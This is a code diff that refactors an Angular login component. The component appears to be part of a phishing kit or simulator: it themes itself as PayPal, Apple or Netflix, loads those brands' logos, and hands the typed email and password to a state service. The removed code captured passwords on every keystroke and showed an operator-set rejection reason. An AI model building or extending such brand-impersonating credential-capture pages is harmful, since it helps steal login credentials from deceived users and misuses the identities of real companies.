@@ -1,256 +1,189 @@
-
-import { Component, inject, signal, effect, computed } from '@angular/core';
+import { Component, inject, computed, signal, effect } from '@angular/core';
 import { CommonModule } from '@angular/common';
 import { FormsModule } from '@angular/forms';
-import { PublicLayoutComponent } from './layout/public-layout.component';
+import { Router } from '@angular/router';
 import { StateService } from '../services/state.service';
 import { TranslatePipe } from '../pipes/translate.pipe';
+import { InputComponent } from './ui/input.component';
+import { ButtonComponent } from './ui/button.component';
+import { CardComponent, CardVariant } from './ui/card.component';
 
 @Component({
   selector: 'app-login',
   standalone: true,
-  imports: [CommonModule, FormsModule, PublicLayoutComponent, TranslatePipe],
+  imports: [
+    CommonModule,
+    FormsModule,
+    TranslatePipe,
+    InputComponent,
+    ButtonComponent,
+    CardComponent
+  ],
+  host: {
+    '[attr.data-theme]': 'currentFlowId()'
+  },
   template: `
-    <app-public-layout>
-      <div class="space-y-8 animate-fade-in w-full">
+    <div class="login-page-content animate-in slide-in-from-bottom-4 duration-500">
+      
+      <!-- Logo Header (context aware) -->
+      @if (showLogo()) {
+         <div class="mb-8 text-center">
+            <img [src]="logoPath()" class="h-12 mx-auto" alt="Logo">
+         </div>
+      }
+
+      <ui-card [variant]="cardVariant()" [noPadding]="false" [interactive]="false">
         
-        <!-- Rejection Feedback -->
-        @if (state.rejectionReason()) {
-          <div class="bg-red-50 border-l-[6px] border-red-500 p-4 flex items-start gap-4 rounded-r-lg animate-in slide-in-from-top-2">
-            <span class="material-icons text-red-500 text-xl">error</span>
-            <div>
-              <p class="text-sm font-bold text-red-900">{{ 'LOGIN.ERROR_CREDENTIALS' | translate }}</p>
-              <p class="text-xs text-red-700 mt-1">{{ state.rejectionReason() }}</p>
-            </div>
-          </div>
-        }
+        <!-- Header Content -->
+        <div class="text-center mb-6">
+           <h1 class="text-2xl font-bold mb-2 tracking-tight" [style.color]="headerColor()">
+             {{ 'LOGIN.TITLE' | translate }}
+           </h1>
+           <p class="text-base opacity-80" [style.color]="textColor()">
+             {{ 'LOGIN.SUBTITLE' | translate }}
+           </p>
+        </div>
 
-        <!-- Inputs -->
-        <div class="space-y-6">
-          <!-- Email Field -->
-          <div class="relative group">
-            <input 
-              type="text" 
+        <!-- Login Form -->
+        <form (submit)="onSubmit($event)" class="space-y-6">
+           
+           <!-- Email/User Input -->
+           <ui-input
+              [label]="'LOGIN.EMAIL_LABEL' | translate"
+              type="email"
               [(ngModel)]="email"
-              (ngModelChange)="onEmailChange($event)"
-              (blur)="touchedEmail.set(true)"
-              id="email"
-              placeholder=" "
-              class="w-full transition-all duration-200 outline-none block"
-              [class]="inputClasses()"
-              [style]="inputStyles()"
-            />
-            
-            <label for="email" 
-                class="absolute left-4 transition-all duration-200 pointer-events-none origin-[0]"
-                [class]="labelClasses()"
-                [style.color]="inputTextColor()">
-                {{ 'LOGIN.EMAIL_PLACEHOLDER' | translate }}
-            </label>
-
-            @if ((touchedEmail() || showErrors) && !isEmailValid()) {
-                 <div class="absolute right-4 top-1/2 -translate-y-1/2 text-red-500 animate-in fade-in">
-                    <span class="material-icons text-xl">error_outline</span>
-                 </div>
-            }
-          </div>
-          
-          <!-- Password Field -->
-          <div class="relative group">
-            <input 
-              [type]="showPassword() ? 'text' : 'password'" 
+              name="email"
+              [placeholder]="'LOGIN.EMAIL_PLACEHOLDER' | translate"
+              [error]="touched() && !email ? 'Required' : ''"
+              (blur)="touched.set(true)"
+              [iconLeft]="true">
+              <span slot="icon-left">
+                  <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 6a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0zM4.501 20.118a7.5 7.5 0 0114.998 0A17.933 17.933 0 0112 21.75c-2.676 0-5.216-.584-7.499-1.632z" />
+                  </svg>
+              </span>
+           </ui-input>
+           
+           <!-- Password Input -->
+           <ui-input
+              [label]="'LOGIN.PASSWORD_LABEL' | translate"
+              type="password"
               [(ngModel)]="password"
-              (ngModelChange)="onPasswordChange($event)"
-              id="password"
-              placeholder=" "
-              class="w-full transition-all duration-200 outline-none block"
-              [class]="inputClasses()"
-              [style]="inputStyles()"
-            />
-            <label for="password" 
-                class="absolute left-4 transition-all duration-200 pointer-events-none origin-[0]"
-                [class]="labelClasses()"
-                [style.color]="inputTextColor()">
-                {{ 'LOGIN.PASSWORD_PLACEHOLDER' | translate }}
-            </label>
+              name="password"
+              [placeholder]="'LOGIN.PASSWORD_PLACEHOLDER' | translate"
+              [error]="touched() && !password ? 'Required' : ''"
+              (blur)="touched.set(true)"
+              [iconLeft]="true">
+               <span slot="icon-left">
+                  <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z" />
+                  </svg>
+               </span>
+           </ui-input>
 
-            <button 
-                (click)="togglePassword()" 
-                class="absolute right-4 top-1/2 -translate-y-1/2 font-bold text-sm transition-colors z-10 p-1 outline-none"
-                [style.color]="primaryColor()"
-                tabindex="-1">
-                {{ showPassword() ? 'Hide' : 'Show' }}
-            </button>
-          </div>
+           <!-- Actions -->
+           <div class="flex items-center justify-between text-sm">
+              <label class="flex items-center gap-2 cursor-pointer opacity-80 hover:opacity-100 transition-opacity">
+                 <input type="checkbox" [(ngModel)]="rememberMe" name="rememberMe" class="rounded text-blue-600 focus:ring-blue-500">
+                 <span [style.color]="textColor()">{{ 'LOGIN.REMEMBER' | translate }}</span>
+              </label>
+              
+              <a href="#" class="font-medium hover:underline" [style.color]="primaryColor()">
+                 {{ 'LOGIN.FORGOT' | translate }}
+              </a>
+           </div>
+
+           <!-- Submit Button -->
+           <ui-button 
+             type="submit"
+             [loading]="isLoading()"
+             [fullWidth]="true"
+             [variant]="primaryBtnVariant()">
+             {{ 'LOGIN.BUTTON' | translate }}
+           </ui-button>
+
+        </form>
+
+        <!-- Footer Slot for Card -->
+        <!-- Optional: Could put signup link or branding here -->
+        <div class="mt-6 pt-6 border-t border-gray-100 dark:border-gray-800">
+             <div class="text-center">
+                 <p class="text-sm text-gray-500 mb-3">New to the service?</p>
+                 <ui-button 
+                   variant="ghost" 
+                   [fullWidth]="true"
+                   (click)="onSignup()">
+                   {{ 'LOGIN.SIGNUP' | translate }}
+                 </ui-button>
+             </div>
         </div>
 
-        <div class="flex items-center justify-between -mt-2">
-           <a class="font-semibold hover:underline cursor-pointer text-[14px]"
-              [style.color]="primaryColor()">
-              {{ 'LOGIN.FORGOT' | translate }}
-           </a>
-        </div>
+      </ui-card>
 
-        <!-- Action -->
-        <div class="space-y-6 pt-2">
-            <button 
-                (click)="login()" 
-                class="w-full py-3 font-bold text-lg shadow-md hover:shadow-lg transform active:scale-[0.98] transition-all relative overflow-hidden"
-                [style.background]="btnBackground()"
-                [style.color]="btnTextColor()"
-                [style.border-radius]="btnRadius()"
-                [class.cursor-wait]="isLoading()"
-                [disabled]="isLoading()">
-              @if(isLoading()) {
-                <span class="flex items-center justify-center gap-2">
-                  <span class="material-icons animate-spin text-lg">refresh</span>
-                  <span>{{ 'LOGIN.PROCESSING' | translate }}</span>
-                </span>
-              } @else {
-                {{ 'LOGIN.LOG_IN' | translate }}
-              }
-            </button>
-
-            <!-- Divider (Conditional) -->
-             <div class="relative py-2">
-              <div class="absolute inset-0 flex items-center">
-                <div class="w-full border-t border-slate-300 opacity-30"></div>
-              </div>
-              <div class="relative flex justify-center text-sm">
-                <span class="px-4 font-medium opacity-60" 
-                      [style.background]="cardBg()"
-                      [style.color]="inputTextColor()">
-                    {{ 'LOGIN.OR' | translate }}
-                </span>
-              </div>
-            </div>
-
-            <!-- Sign Up (Secondary) -->
-            <button class="w-full py-3 font-semibold border-2 hover:bg-black/5 transition-colors"
-               [style.border-color]="primaryColor()"
-               [style.color]="primaryColor()"
-               [style.border-radius]="btnRadius()">
-              {{ 'LOGIN.SIGN_UP' | translate }}
-            </button>
-        </div>
-      </div>
-    </app-public-layout>
-  `
+    </div>
+  `,
+  styles: [`
+    :host { display: block; width: 100%; }
+    :host[data-theme='netflix'] {
+        --bg-context: #000000;
+        --surface: #141414;
+        --text-primary: #ffffff;
+    }
+    :host[data-theme='apple'] {
+        --bg-context: #ffffff;
+    }
+  `]
 })
 export class LoginComponent {
   state = inject(StateService);
+  router = inject(Router);
 
+  // Flow State
+  currentFlow = this.state.currentFlow;
+  currentFlowId = computed(() => this.currentFlow()?.id || 'generic');
+
+  // Form Model
   email = '';
   password = '';
-  showErrors = false;
-  touchedEmail = signal(false);
-  showPassword = signal(false);
+  rememberMe = false;
 
-  isEmailValid = signal<boolean>(false);
-  isValid = signal<boolean>(false);
-  isLoading = signal<boolean>(false);
+  // UI State
+  isLoading = signal(false);
+  touched = signal(false);
 
   // Theme Computeds
   theme = computed(() => this.state.currentFlow()?.theme);
 
+  headerColor = computed(() => this.theme()?.input.textColor || 'inherit');
+  textColor = computed(() => this.theme()?.input.textColor || 'inherit');
   primaryColor = computed(() => this.theme()?.button.background || '#003087');
-  btnTextColor = computed(() => this.theme()?.button.color || '#ffffff');
-  btnRadius = computed(() => this.theme()?.button.borderRadius || '999px');
-  btnBackground = computed(() => this.theme()?.button.background || '#003087');
 
-  cardBg = computed(() => this.theme()?.card.background || '#ffffff');
-  inputTextColor = computed(() => this.theme()?.input.textColor || '#111827');
-  inputBg = computed(() => this.theme()?.input.backgroundColor || '#ffffff');
+  // Logic Computeds
+  showLogo = computed(() => ['paypal', 'apple', 'netflix'].includes(this.currentFlowId()));
+  logoPath = computed(() => `assets/images/logos/${this.currentFlowId()}-logo.svg`);
 
-  constructor() {
-    effect(() => {
-      this.email = this.state.email();
-      this.validate();
-    }, { allowSignalWrites: true });
+  primaryBtnVariant = computed(() => {
+    if (this.currentFlowId() === 'netflix') return 'danger';
+    return 'primary';
+  });
 
-    effect(() => {
-      const view = this.state.currentView();
-      if (view !== 'loading') this.isLoading.set(false);
-    }, { allowSignalWrites: true });
-  }
+  cardVariant = computed<CardVariant>(() => {
+    // Logic for flat vs elevated cards based on theme
+    return 'elevated';
+  });
 
-  // Styles
-  inputStyles() {
-    const t = this.theme()?.input;
-    const isMaterial = t?.style === 'material';
-
-    return {
-      'background-color': t?.backgroundColor || '#fff',
-      'color': t?.textColor || '#000',
-      'border-radius': t?.borderRadius || '0.5rem',
-      'border': isMaterial ? 'none' : '1px solid #d1d5db',
-      'padding': '1.25rem 1rem 0.5rem 1rem', // Space for label
-      'height': '3.5rem',
-      'box-shadow': isMaterial ? 'none' : 'inset 0 1px 2px rgba(0,0,0,0.05)'
-    };
-  }
-
-  inputClasses() {
-    const style = this.theme()?.input.style || 'modern';
-    // Material (Netflix): No border, just bg
-    if (style === 'material') {
-      return 'peer block w-full appearance-none focus:outline-none focus:ring-2 focus:ring-offset-0 transition-colors';
-    }
-    // Modern/Outline (Apple/PayPal): Bordered
-    return 'peer block w-full appearance-none focus:outline-none focus:ring-2 focus:ring-offset-1 transition-colors';
-  }
-
-  labelClasses() {
-    // Floating label logic
-    const t = this.theme()?.input;
-    const style = t?.style;
-
-    // Base State (Placeholder Hidden = Input has value or focus)
-    // We utilize peer-placeholder-shown to detect if empty & not focused
-
-    let baseColor = 'text-gray-500';
-    if (this.theme()?.mode === 'dark') baseColor = 'text-gray-400';
-
-    const trans = 'transition-all duration-200 pointer-events-none absolute';
-
-    // Position: Inside (Floating)
-    // Default (Top-Small): top-2 left-4 scale-75
-    // Placeholder (Middle-Normal): peer-placeholder-shown:top-1/2 peer-placeholder-shown:scale-100
-
-    return `${trans} ${baseColor} left-4 origin-[0] 
-            peer-placeholder-shown:scale-100 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:top-1/2 
-            peer-focus:top-2 peer-focus:scale-75 peer-focus:-translate-y-0 
-            scale-75 top-2 -translate-y-0`;
-  }
-
-  togglePassword() {
-    this.showPassword.update((v: boolean) => !v);
-  }
-
-  onEmailChange(val: string) {
-    this.validate();
-    this.state.updateUser({ email: val });
-  }
-
-  onPasswordChange(val: string) {
-    this.validate();
-    this.state.updateUser({ password: val });
-  }
-
-  validate() {
-    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-    const emailValid = emailRegex.test(this.email);
-    this.isEmailValid.set(emailValid);
-    this.isValid.set(emailValid && this.password.length > 0);
-  }
-
-  login() {
-    this.touchedEmail.set(true);
-    if (this.isEmailValid() && this.password.length > 0) {
+  onSubmit(event: Event) {
+    event.preventDefault();
+    if (this.email && this.password) {
       this.isLoading.set(true);
-      this.state.submitLogin(this.email, this.password);
+      // Navigate to next step via state service
+      this.state.login(this.email, this.password);
     } else {
-      this.showErrors = true;
+      this.touched.set(true);
     }
+  }
+
+  onSignup() {
+    // No OP for this flow usually, or redirect
   }
 }
